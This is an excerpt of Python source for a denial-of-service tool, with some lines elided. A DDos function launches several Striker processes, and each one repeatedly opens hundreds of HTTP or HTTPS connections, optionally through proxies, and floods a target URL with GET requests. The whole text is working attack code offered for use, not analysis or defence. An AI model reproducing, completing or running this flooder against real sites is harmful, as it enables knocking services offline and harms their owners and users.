...
def DDos(url: str, sockets = 500, threads = 10, proxies = None):
    assert checkUrl(url)
    if proxies is not None:
        for proxy in proxies: assert checkProxy(proxy)
    workersQueue = [Striker(url, sockets, not i, threads, proxies) for i in range(threads)]
...
class Striker(__import__('multiprocessing').Process):
    def __init__(self, url, sockets, printer, threads, proxies):
        super(Striker, self).__init__()
        self.packets, self.socks, self.runnable, self.host, self.url, self.sockets, self.ssl, self.printer, self.threads, self.proxies = [0, 0], [], True, url.split("/")[2], "/".join(url.split("/")[3:]).split(";")[0].split("?")[0].split("#")[0], sockets, url.startswith('https'), printer, threads, proxies
    def __del__(self):
        try: self.stop()
    ...
    def run(self):
        while self.runnable:
            try:
                for _ in range(self.sockets): self.socks.append(HTTPConnection(choice(self.proxies).replace("\n", "")) if self.proxies is not None else (HTTPSConnection(self.host) if self.ssl else HTTPConnection(self.host)))
                for conn_req in self.socks:
                    ...
                    conn_req.request("GET", (("https://" if self.ssl else "http://") + self.host + self.url) if self.proxies is not None else url, None, headers)
